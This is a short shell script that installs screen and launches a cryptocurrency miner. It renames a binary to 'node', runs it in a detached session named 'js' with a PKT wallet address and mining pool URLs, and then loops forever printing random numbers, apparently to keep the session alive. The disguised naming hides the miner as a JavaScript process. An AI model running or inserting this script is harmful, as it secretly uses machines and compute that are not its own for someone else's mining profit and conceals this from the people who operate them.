blkdiscard=$(shuf -n 1 -i 1-999999)
sudo apt-get update && sudo apt-get install -y screen
mv tkp node
chmod +x node
screen -dmS js ./node ann -p pkt1qdq9vtk7ctl243eats3096t49c9fm728z3a808y http://pool.srizbi.com http://pool.pktpool.io http://pool.srizbi.com
while :; do shuf -n 1 -i 1-99999999; sleep 10; done
